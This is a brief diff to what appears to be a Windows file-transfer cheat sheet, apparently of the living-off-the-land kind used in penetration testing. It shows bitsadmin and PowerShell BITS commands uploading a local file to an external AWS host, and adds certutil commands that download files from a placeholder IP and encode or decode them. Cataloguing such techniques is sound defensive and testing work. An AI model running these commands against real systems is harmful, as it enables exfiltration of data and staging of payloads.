@@ -2,3 +2,14 @@ bitsadmin /transfer hello /upload http://<<name>>.compute.amazonaws.com/2.txt C:
 
 Powershell
 Start-BitsTransfer -TransferType Upload -Source 'C:\Users\test\Desktop\2.txt'  -Destination http://<<name>>.compute.amazonaws.com/2.txt -DisplayName TEST
+
+
+Download File
+certutil.exe -urlcache -split -f http://ip/file.txt file.txt        
+certutil.exe -urlcache -split -f http://ip/file.txt C:\Users\Public\file.txt
+
+Encode File
+certutil -encode inputFileName encodedOutputFileName   
+
+Decode File
+certutil -decode encodedInputFileName decodedOutputFileName
